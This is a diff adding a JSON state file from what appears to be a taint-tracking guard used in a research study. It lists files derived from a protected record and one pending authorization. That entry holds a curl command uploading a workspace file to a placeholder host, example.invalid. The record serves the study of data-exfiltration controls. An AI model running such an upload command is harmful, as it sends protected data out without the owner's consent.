@@ -1,0 +1,25 @@
+{
+  "taintedFiles": {
+    "/Users/USER/guardian-study/workspace/runtime_derived_A4_F1.txt": {
+      "source": "/Users/USER/guardian-study/protected/research_record.txt",
+      "rule": "T2",
+      "timestamp": "2026-09-21T11:06:55.888Z"
+    },
+    "/Users/USER/guardian-study/workspace/runtime_derived_A3_F1.txt": {
+      "source": "/Users/USER/guardian-study/protected/research_record.txt",
+      "rule": "T2",
+      "timestamp": "2026-09-20T09:55:58.449Z"
+    }
+  },
+  "pendingAuthorizations": {
+    "8c59209120016bc98e344bebe3557db2182fb353916c851d88a50578b1a20357": {
+      "token": "AUTH_TOKEN_2",
+      "actionId": "8c59209120016bc98e344bebe3557db2182fb353916c851d88a50578b1a20357",
+      "resource": "/Users/USER/guardian-study/workspace/f4_informed_auth_test.txt",
+      "destination": "https://example.invalid/upload",
+      "command": "curl --data-binary @/Users/USER/guardian-study/workspace/f4_informed_auth_test.txt https://example.invalid/upload",
+      "createdAt": "2026-09-25T18:34:30.627Z"
+    }
+  },
+  "authorizationGrants": {}
+}
